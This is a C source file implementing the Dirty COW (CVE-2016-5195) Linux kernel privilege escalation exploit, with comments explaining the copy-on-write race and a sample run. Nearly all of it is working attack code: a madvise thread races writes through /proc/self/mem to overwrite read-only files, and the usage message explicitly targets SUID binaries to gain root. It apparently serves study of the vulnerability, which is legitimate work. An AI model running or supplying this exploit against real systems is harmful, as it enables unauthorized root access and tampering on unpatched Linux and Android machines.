// DirtyCow
// CVE-2016-5195

// Dirty Cow (Dirty copy-on-write) is a computer security vulnerability for
// the Linux kernel that affects all Linux-based operating systems including
// Android. It is a local privilege escalation bug that exploits a [race
// condition] in the implementation of the [copy-on-write] mechanism in the
// kernel's memory-management subsystem.

// The vulnerability was discovered by Phil Oester.

// To Centos Users:

    // At the time of public disclosure, the in the wild exploit that we were aware of
    // did not work on Red Hat Enterprise Linux 5 and 6 out of the box because on one 
    // side of the race it writes to /proc/self/mem, but /proc/self/mem is not writable
    // on Red Hat Enterprise Linux 5 and 6.

    // Since public disclosure several Proof of Concepts (POC) have been published, 
    // that use [ptrace] method, which do work on Red Hat Enterprise Linux 5 & 6. 

/*

$ make
$ ./exploit foo 11111111111
+----------------------------------------------------------------+
+ exploit : DirtyCow - CVE-2016-5195                             +
+ details : https://chao-tic.github.io/blog/2017/05/24/dirty-cow +
+----------------------------------------------------------------+
madvise 0

procselfmem 11000000

[*] exploit over !!
lab@kali:/tmp/CVE-2016-5195$ cat foo 
11111111111l

*/

#include <sys/mman.h>
#include <sys/stat.h>
#include <pthread.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>


#define LOOPSIZE 1000000


typedef struct thread_args {
    void *memory;         // mmap() return address
    const char *payload;  // rewritten payload data
} thread_args_t;

int stop = 0;


void*
madviseThread(void *arg)
{
    thread_args_t *targs;
    int i, c=0;

    targs = (thread_args_t *)arg;

    for(i=0; i < LOOPSIZE && !stop; i++)
    {
        c += madvise(targs->memory, 100, MADV_DONTNEED);
    }
    printf("madvise %d\n\n",c);
    pthread_exit((void *)1);
}


void*
procselfmemThread(void *arg)
{
    thread_args_t *targs;
    targs = (thread_args_t *)arg;

    int fd, i;
    ssize_t c;

    // https://elixir.free-electrons.com/linux/latest/source/fs/proc/base.c#L3317
    // REG("mem",       S_IRUSR|S_IWUSR, proc_mem_operations),

    // static const struct file_operations proc_mem_operations = {
    //     .llseek     = mem_lseek,
    //     .read       = mem_read,
    //     .write      = mem_write,
    //     .open       = mem_open,
    //     .release    = mem_release,
    // };

    fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) {
        fprintf(stderr, "open() /proc/self/mem failed: %s\n", strerror(errno));
        pthread_exit((void *)2);
    }

    for(i = 0, c = 0; i < LOOPSIZE && !stop; i++) {
        lseek(fd, (uintptr_t) targs->memory, SEEK_SET);
        c += write(fd, targs->payload, strlen(targs->payload));
    }

    stop = 1;
    printf("procselfmem %ld\n\n", c);
    pthread_exit((void *)1);
}


void
exploit(const char *filename, const char *payload)
{

    int           fd,     err;
    struct        stat    fst;
    pthread_t     pth1,   pth2;
    thread_args_t thargs;

    if ((fd = open(filename, O_RDONLY)) < 0)
    {
        fprintf(stderr, "open() failed: %s\n", strerror(errno));
        exit(1);
    }

    if (fstat(fd, &fst) != 0)
    {
        fprintf(stderr, "fstat() failed: %s\n", strerror(errno));
        exit(1);
    }

    if (strlen(payload) > fst.st_size)
    {
        printf("[!] payload size should be smaller than (%zd) bytes.\n", fst.st_size);
    }

    // [CSAPP]: Sharing Revisited: Private Copy-on-write (COW) Objects

    // 1. Instruction wrting to private page triggers protection fault.
    // 2. Handler creates new R/W page.
    // 3. Instruction restarts upon handler return.
    // 4. Copying deferred as long as possible.

    thargs.memory = mmap(NULL, fst.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (thargs.memory == MAP_FAILED)
    {
        fprintf(stderr, "mmap() failed: %s\n", strerror(errno));
        exit(1);
    }

    thargs.payload = payload;

    err = pthread_create(&pth1, NULL, madviseThread, (void *)&thargs);
    if (err != 0)
    {
        fprintf(stderr, "pthread_create() madivse thread failed: %s\n", strerror(errno));
        exit(0);
    }

    err = pthread_create(&pth2, NULL, procselfmemThread, (void *)&thargs);
    if (err != 0)
    {
        fprintf(stderr, "pthread_create() procselfmem thread failed: %s\n", strerror(errno));
        exit(0);
    }

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    close(fd);

    printf("[*] exploit over !!\n");
}


void
welcome(void)
{
    printf("+----------------------------------------------------------------+\n"
           "+ exploit : DirtyCow - CVE-2016-5195                             +\n"
           "+ details : https://chao-tic.github.io/blog/2017/05/24/dirty-cow +\n"
           "+----------------------------------------------------------------+\n");
}


int main(int argc, char *argv[])
{
    welcome();

    if (argc != 3) {
        fprintf(stderr, "%s\n", "usage   : exploit <SUID-FILE> <STR DATA>");
        return 1; 
    }

    exploit(argv[1], argv[2]);
    return 0;
}

// https://dirtycow.ninja/
// https://en.wikipedia.org/wiki/Dirty_COW
// https://access.redhat.com/security/cve/cve-2016-5195
// https://access.redhat.com/security/vulnerabilities/2706661
// https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
// http://man7.org/linux/man-pages/man2/madvise.2.html
// https://www.gnu.org/software/libc/manual/html_node/Memory_002dmapped-I_002fO.html
// https://www.gnu.org/software/libc/manual/html_node/Reading-Attributes.html
// https://cboard.cprogramming.com/c-programming/172626-c-thread-argument-value-dirtyc0w-c.html
// https://chao-tic.github.io/blog/2017/05/24/dirty-cow
// https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679
// http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/lectures/18-vm-systems.pdf